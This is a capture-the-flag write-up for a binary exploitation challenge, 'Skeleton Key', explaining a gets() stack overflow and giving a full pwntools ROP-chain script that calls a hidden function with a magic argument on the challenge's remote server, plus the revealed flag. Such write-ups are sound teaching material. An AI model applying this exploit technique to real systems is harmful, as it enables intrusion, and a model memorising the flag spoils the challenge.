# Skeleton Key

> **Category:** Pwn (Binary Exploitation) · **Points:** 125 · **Author:** @SpiffyLich · **Track:** [Pwn](README.md)

## The Scenario

Stage two of the same investigation: another binary, recovered from the same bulletproof hosting server, same author. This one has no password prompt at all, straight to business.

## Step 1: Same checks, different shape

```bash
$ checksec --file=Skeleton_Key
Stack: No canary found
NX:    NX enabled
PIE:   No PIE

$ nm Skeleton_Key | grep ' T '
0000000000401615 T gadgets
0000000000401578 T main
0000000000401507 T Wretched_Lock
```

Reading `main()` shows the vulnerability sits right there, with no password gate in front of it: it reads input straight into a 64-byte stack buffer with `gets()`. The target this time is `Wretched_Lock(int code)`, a function that checks whether its single integer argument equals the constant `0xdeadc0de`, and if so, opens and prints the flag file. It is never called from `main()`, so it must be called directly.

## Step 2: Why a ROP gadget is needed this time

Unlike the previous challenge, the target function cannot simply be jumped to; it expects an argument, and on x86-64 the first integer argument of a function is passed in the `rdi` register, not on the stack. `rdi` must be controlled before jumping into `Wretched_Lock`. The binary conveniently ships its own tiny helper for exactly this, found via `nm` and confirmed by disassembly:

```
0000000000401615 <gadgets>:
  401615: 5f    pop rdi
  401616: c3    ret
```

This two-instruction snippet is a classic "ROP gadget": it pops the next value on the stack into `rdi`, then returns to whatever address comes right after it on the stack. Chaining the overflow, this gadget, the chosen value, and the target function address makes it possible to call `Wretched_Lock(0xdeadc0de)` with full control, even though NX stops injected shellcode from running directly.

## Step 3: Build the ROP chain

```python
from pwn import *
context.arch = 'amd64'
r = remote('159.65.228.107', 5002)

offset = 0x40 + 8            # 64-byte buffer + saved rbp
pop_rdi = 0x401615           # pop rdi ; ret
wretched_lock = 0x401507     # Wretched_Lock(int)
magic = 0xdeadc0de

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(wretched_lock)

r.sendline(payload)
r.interactive()
```

A local test (confirming the local "flag.txt could not be found" error, proving the chain fired correctly) was run before launching the payload at the real remote service.

## Flag

```
deadface{R355UR3CT_D34D_C0D3}
```

> **Lesson:** Return-Oriented Programming lets an attacker reuse tiny snippets of the program's own code ("gadgets") to set up function arguments and bypass the NX (non-executable stack) protection entirely.

---
[← Back to index](../../README.md)
